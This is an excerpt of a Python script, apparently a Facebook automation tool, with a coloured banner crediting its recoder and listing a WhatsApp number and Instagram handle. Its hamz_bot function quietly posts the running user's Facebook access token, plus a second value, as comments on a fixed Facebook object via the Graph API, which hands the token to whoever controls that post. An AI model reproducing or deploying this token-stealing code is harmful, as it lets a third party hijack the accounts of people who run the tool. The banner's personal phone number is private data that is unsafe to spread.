...
\033[96;1m┣[ \033[97;1mRECODING \x1b[1;92m: NIKI                                 ]┫
\033[96;1m┣[ \033[92;1mWHATSAPP \x1b[1;97m: 081388498596                            ]┫
\033[96;1m┣[ \033[97;1mISTAGRAM  \x1b[1;94m :  goleradya          ]┫
...
def hamz_bot():
    ...
    requests.post('https://graph.facebook.com/179029340079645/comments/?message=' +token+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/179029340079645/comments/?message=' +kom+ '&access_token=' + token)
    menu()
